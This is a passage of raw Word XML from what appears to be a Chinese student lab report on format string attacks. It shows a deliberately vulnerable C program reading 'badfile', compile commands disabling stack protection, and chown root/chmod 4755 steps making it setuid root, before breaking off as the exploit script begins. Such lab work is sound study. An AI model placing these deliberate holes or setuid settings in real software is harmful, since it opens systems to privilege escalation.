                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, *ret);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="163A45A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548E1F42" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="6B5204C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main(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>int</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argc</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argv</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="448E7CB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29546A41"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FILE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
                    <w:p w14:paraId="267D024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proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>str[</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>200</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>];</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="24CE10C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fopen</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badfile</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rb</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10665CB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proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>fread</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 xml:space="preserve">str, </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>sizeof</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000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>char</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200</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badfile</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="42008C3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fmtstr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>(str);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2A0FCD62" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="3B46F34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return</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98658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2BF0D4D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w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="512256AF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:spacing w:after="240"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="2D6446DA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>为简化实验，程序中打印了些额外信息。在第七行，把</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>寄存器的值放在了变量</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ramep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中并打印出来，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>则为返回地址的值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ebp+4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。此外还打印了调用</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>函数前后该返回地址域的内容，目的是看它的内容是否改变，如果没有则说明攻击有问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFED369" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>使用以下命令对其编译并设置权限</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D016885" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="184" w:author="zhao ruizhi" w:date="2023-05-08T16:16:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78316A1A" wp14:editId="1AC06195">
              <wp:extent cx="5274310" cy="1986915"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="987467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67852" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId30"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1986915"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5A137614" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="185" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:noProof/>
          <w:sz w:val="24"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251661312" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="616C479A" wp14:editId="1203BACF">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>289560</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>52070</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="1412875"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="5080"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="20" name="文本框 20"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="1412875"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="166945D2"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-z </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>execstack</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -o </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>fmtvul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -m32 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>fmtvul.c</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="5FA852F1"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chown</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> root </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>fmtvul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="5782D69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chmod</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> 4755 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>fmtvul</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="516F6666" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="39B84773" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="616C479A" id="文本框 20" o:spid="_x0000_s1035" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:22.8pt;margin-top:4.1pt;width:392.9pt;height:111.2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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="166945D2"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gcc</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -z </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>execstack</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -o </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>fmtvul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -m32 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>fmtvul.c</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="5FA852F1"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chown</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> root </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>fmtvul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="5782D698" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>(username</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>㉿</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>kali)-[~/Desktop/System Security/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>StringFormat</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t xml:space="preserve">] $ </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>sudo</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>chmod</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> 4755 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>fmtvul</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="516F6666" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="39B84773" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mtexploit.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>用于构造恶意输入以利用</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mtvul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中的格式化字符串漏洞，它会将构造好的输入保存至</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中，源代码如下所示：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D99CBEF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:rPrChange w:id="186" w:author="zhao ruizhi" w:date="2023-05-08T16:54:00Z">
            <w:rPr>
              <w:rFonts w:cs="Tahoma"/>
              <w:sz w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="187" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:rPrChange w:id="188" w:author="zhao ruizhi" w:date="2023-05-08T16:54:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
                <w:sz w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>根据自己的环境已经更改的源代码如下所示：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="403182C4" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251669504" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="34226533" wp14:editId="269132BD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1466850</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>57150</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4947920" cy="6623050"/>
                <wp:effectExtent l="0" t="0" r="24130" b="25400"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="27" name="文本框 27"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4947920" cy="6623050"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6E38E3A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8000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>#!/</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
